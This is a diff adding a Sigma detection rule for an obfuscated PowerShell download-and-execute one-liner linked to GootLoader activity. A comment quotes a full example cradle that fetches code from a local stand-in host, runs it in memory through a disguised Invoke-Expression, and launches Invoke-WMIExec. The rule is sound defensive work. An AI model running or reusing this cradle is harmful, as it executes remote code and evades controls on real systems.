@@ -1,0 +1,31 @@
+<!-- source: https://github.com/SigmaHQ/sigma/blob/4faa9d9d378f726638eb1284e6efd53f1990ee82/rules/windows/process_creation/proc_creation_win_powershell_download_cradle_obfuscated.yml -->
+title: Obfuscated PowerShell OneLiner Execution
+id: 44e24481-6202-4c62-9127-5a0ae8e3fe3d
+status: test
+description: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.
+references:
+    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
+    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
+author: '@Kostastsale, TheDFIRReport'
+date: 2022-05-09
+modified: 2025-04-16
+tags:
+    - attack.execution
+    - attack.defense-impairment
+    - attack.t1059.001
+    - attack.t1685
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        # Example: powershell -nop -noni -ep bypass -w h -c "$u=("http://127.0.0.1:1337/"|%%{(IRM $_)});&("".SubString.ToString()[67,72,64]-Join"")($u); Import-Module C:\Users\EXAMPLE\Invoke-WMIExec.ps1; Invoke-WMIExec"
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains|all:
+            - 'http://127.0.0.1'
+            - '%{(IRM $_)}'
+            - 'Invoke'
+    condition: selection
+falsepositives:
+    - Unknown
+level: high
